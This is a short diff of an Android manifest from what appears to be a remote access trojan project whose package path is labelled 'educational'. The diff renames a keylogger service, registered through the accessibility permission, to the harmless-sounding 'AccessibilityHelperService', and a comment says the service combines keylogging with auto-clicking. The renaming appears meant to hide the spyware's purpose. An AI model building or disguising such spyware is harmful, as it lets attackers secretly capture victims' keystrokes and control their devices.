@@ -97,9 +97,9 @@
             </intent-filter>
         </receiver>
 
-        <!-- Accessibility Service for Keylogger -->
+        <!-- Combined Accessibility Service (Keylogger + Auto-Click) -->
         <service
-            android:name="com.remoteaccess.educational.ultimate.rat.KeyloggerService"
+            android:name="com.remoteaccess.educational.permissions.AccessibilityHelperService"
             android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
             <intent-filter>
